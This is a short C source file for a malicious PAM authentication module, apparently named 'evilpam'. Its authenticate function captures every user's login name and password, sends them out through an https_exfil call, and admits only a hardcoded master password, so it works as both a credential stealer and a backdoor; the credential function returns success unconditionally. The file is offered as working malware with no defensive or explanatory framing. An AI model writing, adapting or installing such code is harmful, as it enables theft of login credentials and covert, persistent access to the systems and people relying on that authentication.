#include "evilpam.h"


int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
    return PAM_SUCCESS;
}


int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
    const void *username;
    const char *password;
    
    pam_get_item(pamh, PAM_USER, &username);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    https_exfil((const char *)username, password);
    

    if(strcmp(password, MASTER_PASSWORD) == 0){
        return PAM_SUCCESS;
    }

    return PAM_CRED_ERR;
}
